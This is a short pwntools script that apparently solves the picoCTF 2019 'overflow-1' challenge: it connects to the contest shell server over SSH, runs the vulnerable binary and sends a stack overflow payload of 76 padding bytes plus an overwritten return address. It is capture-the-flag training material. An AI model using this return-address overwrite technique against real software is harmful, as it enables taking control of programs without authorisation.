#!/usr/bin/python
from pwn import *
from getpass import getpass

pico_user = input("Username: ")[:-1]
pico_pass = getpass("Password: ")

conn = ssh(host = '2019shell1.picoctf.com', user = pico_user, password = pico_pass)

location = '/problems/overflow-1_4_6e02703f87bc36775cc64de920dfcf5a'

print("running vuln")
vuln = conn.process(location + '/vuln', cwd = location)

print("sending payload")
vuln.sendlineafter('\n', ('A' * 76).encode() + p32(0x080485e6))
vuln.recvline()

print("done")
vuln.interactive()

